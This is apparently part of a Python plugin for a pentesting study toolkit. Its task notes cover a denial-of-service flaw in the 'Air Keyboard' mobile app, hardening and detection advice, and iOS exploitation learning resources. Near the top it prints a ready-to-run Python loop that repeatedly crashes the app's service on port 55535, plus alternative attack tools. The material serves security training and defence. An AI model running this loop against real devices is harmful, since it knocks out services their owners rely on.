1. Hard-coded AES key (static, not per-session)
2. ECB mode (weak, no IV)
3. Missing length validation
4. Unhandled exceptions in decryption

Persistent DoS:
```python
import socket
import time

target = "192.168.1.50"
while True:
    try:
        socket.create_connection((target, 55535)).send(b"A"*32)
        print("[+] Service crashed")
        time.sleep(5)  # Wait for potential restart
    except:
        pass
```

Why It Works:
- OpenSSL AES_decrypt() called on garbage data
- C++ exception thrown in JNI code
- Java doesn't catch native exceptions
- Background service thread terminates

Mitigation (Developer):
- Validate packet length before decryption
- Wrap AES_decrypt() in try-catch (JNI)
- Use authenticated encryption (AES-GCM)
- Generate per-session keys (not static)

OSCP Relevance: LOW
- DoS only (no code execution or data theft)
- Mobile-specific (not applicable to OSCP targets)
- Demonstrates: importance of exception handling
                        """,
                        'success_indicators': [
                            'Connection succeeds to port 55535',
                            'Target service stops responding',
                            'App crashes or restarts'
                        ],
                        'failure_indicators': [
                            'Port 55535 closed (app not running)',
                            'Service handles exception gracefully',
                            'Updated version with fix'
                        ],
                        'alternatives': [
                            'Metasploit auxiliary/dos/android/air_keyboard',
                            'scapy: send crafted TCP packets',
                            'Manual: telnet target 55535 → type garbage'
                        ],
                        'next_steps': [
                            'Document DoS impact for report',
                            'Test against different Android versions',
                            'Research potential RCE escalation'
                        ]
                    }
                },
                {
                    'id': 'air-keyboard-mitigation',
                    'name': 'Hardening & Detection Recommendations',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Blue team recommendations for detecting and mitigating mobile remote input attacks',
                        'tags': ['OSCP:LOW', 'DEFENSE'],
                        'notes': """
Defensive Measures & Detection:

DEVELOPER RECOMMENDATIONS (Air Keyboard & Similar Apps):

1. Bind to Localhost Only:
   - Listener: 127.0.0.1:8888 (not 0.0.0.0:8888)
   - Require companion app tunnel via USB/BLE
   - Prevents LAN-based attacks entirely

2. Implement Authentication:
   - Per-device pairing PIN (QR code exchange)
   - Derive session keys via ECDHE key exchange
   - Mutual authentication (client + server)

3. Use TLS Encryption:
   - Switch from ws:// to wss:// (WebSocket Secure)
   - Use Apple Network Framework with NWListener + TLS
   - Prevent plaintext eavesdropping

4. Add Origin Validation:
   - Verify WebSocket Origin header
   - Whitelist known companion apps
   - Reject unexpected connections

5. Implement Rate Limiting:
   - Max N keystrokes per second
   - Disconnect abusive clients
   - Alert user on rapid injection

6. User Confirmation:
   - On-screen indicator when service active
   - Alert on first connection from new device
   - Optional: require approval for each connection

7. Length/Content Validation:
   - Sanity-check JSON payload sizes
   - Reject suspiciously long/malformed data
   - Prevent buffer overflows

8. Exception Handling (Android):
   - Wrap native crypto calls in try-catch
   - Gracefully handle malformed packets
   - Log errors, don't crash

NETWORK DEFENSE (Blue Team):

1. Network Scanning:
   ```bash
   # Find rogue mobile keyboard services
   sudo nmap -n -p 8888,55535 --open 192.168.0.0/16
   ```

2. Wireshark Detection:
   ```
   # Filter for Air Keyboard traffic
   tcp.port == 8888 && tcp.flags.syn == 1

   # Look for WebSocket upgrade
   http.upgrade contains "websocket" && tcp.port == 8888

   # Detect JSON keystroke payloads
   tcp.port == 8888 && tcp.payload contains "type"
   ```

3. Frida Runtime Detection:
   ```javascript
   // Hook socket() calls to find listeners
   Interceptor.attach(Module.findExportByName(null, "socket"), {
       onEnter: function(args) {
           console.log("[socket] family=" + args[0] + " type=" + args[1]);
       }
   });
   ```

4. iOS App Privacy Report:
   Settings → Privacy & Security → App Privacy Report
   - Shows apps contacting LAN addresses
   - Identifies rogue network services
   - Check for port 8888 connections

5. Mobile EDR Rules:
   Yara-L signature for Air Keyboard traffic:
   ```
   rule air_keyboard_traffic {
       meta:
           description = "Detects Air Keyboard remote input injection"
       strings:
           $json1 = "\\"selectionStart\\"" ascii
           $json2 = "\\"selectionEnd\\"" ascii
           $port = { 22 B8 }  // Port 8888 in network byte order
       condition:
           all of ($json*) and $port
   }
   ```

6. Network Firewall:
   - Block ports 8888 and 55535 at network edge
   - Segment IoT/mobile devices to isolated VLAN
   - Monitor for unusual LAN-to-LAN connections

INCIDENT RESPONSE:

If Air Keyboard attack detected:
1. Disconnect device from network immediately
2. Force-quit Air Keyboard app
3. Review device logs for injected commands
4. Check for opened URLs / installed apps
5. Reset device passwords (may have been stolen)
6. Uninstall vulnerable app permanently

Alternative Secure Solutions:
- Use USB connection (no network exposure)
- Bluetooth keyboard (paired, encrypted)
- Official manufacturer apps with proper security
- Never install "remote keyboard" apps on sensitive devices

OSCP Exam Note:
While Air Keyboard is mobile-specific, the principles apply:
- Unauthenticated network services are dangerous
- Always verify origin/authentication
- Exception handling prevents DoS
- Network segmentation limits attack surface
                        """
                    }
                }
            ]
        })

        # SECTION 9: Educational Resources & Next Steps
        tasks['children'].append({
            'id': 'ios-exploit-education',
            'name': 'iOS Exploitation Learning Path',
            'type': 'parent',
            'children': [
                {
                    'id': 'recommended-reading',
                    'name': 'Recommended Reading & Research',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Essential resources for learning iOS kernel exploitation',
                        'tags': ['OSCP:LOW', 'RESEARCH', 'IOS', 'EDUCATION'],
                        'notes': """
Essential iOS Kernel Exploitation Resources:

1. Foundational Knowledge:
   - XNU Source Code: https://opensource.apple.com/source/xnu/
   - iOS Security Guide: https://support.apple.com/guide/security/welcome/web
   - ARM64 Architecture Reference Manual

2. Exploitation Techniques:
   - Synacktiv Blog: https://www.synacktiv.com/en/publications.html (iOS research)
   - Project Zero Blog: https://googleprojectzero.blogspot.com/ (tagged: iOS)
   - Saar Amar's Research: https://saaramar.github.io/
   - Brandon Azad's Writeups: https://googleprojectzero.github.io/0days-in-the-wild/

3. Heap Exploitation:
   - "The iOS Kernel Heap" by Stefan Esser
   - "Attacking the iOS Kernel" by Ian Beer
   - kfd exploit writeups: https://github.com/felix-pb/kfd/tree/main/writeups

4. Specific CVE Analyses:
   - CVE-2021-30807: https://saaramar.github.io/IOMobileFrameBuffer_LPE_POC/
   - CVE-2020-27950: https://www.synacktiv.com/en/publications/ios-1-day-hunting
   - CVE-2019-8605 (sock_port): https://googleprojectzero.blogspot.com/2019/08/

5. Tools & Techniques:
   - Ghidra iOS Kernelcache Loader: https://github.com/cellebrite-labs/ghidra-ios-loader
   - jtool2: http://www.newosxbook.com/tools/jtool.html
   - img4tool, img4lib (kernelcache decryption)
   - checkra1n jailbreak: https://checkra.in/

6. Community:
   - r/jailbreak (Reddit)
   - iOS Security Discord servers
   - Twitter: Follow iOS security researchers

Learning Path:
1. Understand C, ARM64 assembly, memory management
2. Study XNU architecture (Mach, BSD subsystems)
3. Analyze public iOS exploits step-by-step
4. Practice on older iOS versions (< 14)
5. Gradually work up to modern mitigations (PAC, PPL, SPTM)

Note: iOS kernel exploitation is ADVANCED topic. Requires months/years
of dedicated study. Start with Linux kernel exploitation basics first.
                        """,
                        'success_indicators': [
                            'Foundational concepts understood',
                            'Can read and understand public exploits',
                            'Comfortable with ARM64 assembly'
                        ],
                        'next_steps': [
                            'Work through public CVE PoCs',
                            'Attempt to reproduce vulnerabilities',
                            'Contribute to iOS security research community'
                        ]
                    }
                },
                {
                    'id': 'oscp-relevance',
                    'name': 'iOS Exploitation Relevance to OSCP',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Understand how iOS kernel exploitation relates to OSCP exam preparation',
                        'tags': ['OSCP:LOW', 'EDUCATION'],
                        'notes': """
iOS Kernel Exploitation and OSCP:

OSCP Exam Scope:
- OSCP focuses on: Linux/Windows privilege escalation, web apps, AD
- iOS kernel exploitation is NOT on OSCP exam
- Mobile exploitation is specialized field beyond OSCP

However, Transferable Skills:

1. Heap Exploitation Concepts:
   - Heap sprays, UAF, freelist poisoning transfer to Linux/Windows
   - Understanding memory allocators universal skill

2. Kernel Concepts:
   - KASLR bypass techniques apply to Linux kernel exploits
   - Privilege escalation patterns similar across OSes

3. Binary Analysis:
   - Ghidra, IDA skills apply to Windows PE, Linux ELF analysis
   - Reverse engineering fundamentals identical

4. Vulnerability Research:
   - Diffing techniques (BinDiff) work for any binary patches
   - CVE analysis methodology transfers to Linux/Windows

5. Exploit Development Mindset:
   - Info leak → arbitrary read → arbitrary write → privilege escalation
   - This chain applies to ALL privilege escalation scenarios

Why This Plugin Exists:
- Educational: Understanding modern exploit mitigations (PAC, DEP, ASLR)
- Research: Methodologies transfer to OSCP-relevant platforms
- Completeness: CRACK Track aims to be comprehensive pentesting toolkit

OSCP Exam Preparation Recommendation:
- Focus on OSCP-specific content first
- Study iOS kernel exploitation AFTER passing OSCP
- Use iOS research as advanced learning, not exam prep

This plugin = Post-OSCP learning resource for advanced students
interested in mobile security and kernel exploitation research.
                        """,
                        'success_indicators': [
                            'Understand OSCP exam scope',
                            'Transferable skills identified',
                            'Realistic expectations for exam relevance'
                        ],
                        'next_steps': [
                            'Prioritize OSCP-specific enumeration plugins',
                            'Bookmark iOS research for post-OSCP learning',
                            'Apply heap exploitation concepts to Linux/Windows'
                        ]
                    }
                }
            ]
        })

        return tasks
